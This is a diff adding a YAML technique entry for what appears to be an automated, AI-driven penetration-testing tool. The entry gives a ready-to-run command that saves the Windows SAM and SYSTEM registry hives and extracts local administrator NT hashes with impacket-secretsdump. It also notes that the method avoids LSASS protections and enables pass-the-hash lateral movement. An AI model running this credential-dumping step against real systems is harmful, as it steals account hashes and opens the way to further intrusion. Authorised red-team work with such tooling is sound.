@@ -1,0 +1,33 @@
+name: sam_offline_dump
+category: creds
+description: Offline SAM/SYSTEM dump for local-admin hashes (no live lsass read)
+preconditions:
+- shell_obtained
+- is_local_admin
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: reg save HKLM\SAM C:\\Windows\\Temp\\sam.save /y & reg save HKLM\\SYSTEM
+  C:\\Windows\\Temp\\system.save /y && impacket-secretsdump -sam sam.save -system
+  system.save LOCAL
+parser: impacket_parser
+expected_effects:
+- local_admin_nthash
+- has_hash
+falsifier:
+  pattern: ACCESS_DENIED|file not found|encrypted|SYSKEY mismatch
+  timeout: 45
+model_tier: haiku
+mechanism: 'SAM holds local accounts'' NT hashes, encrypted with SYSKEY (BootKey in
+  SYSTEM hive).
+
+  Saving both hives + secretsdump decrypts offline without touching LSASS → sidesteps
+
+  Credential Guard/LSA Protection. Enables pass-the-hash lateral movement against
+
+  hosts sharing the local admin password (pre-LAPS).
+
+  '
+references:
+  ocd_mindmap: 'Branch 10: Offline SAM/SYSTEM dump'
+  hacktricks: windows-hardening/stealing-credentials/
+hacktricks_ref: windows-hardening/stealing-credentials/README.md
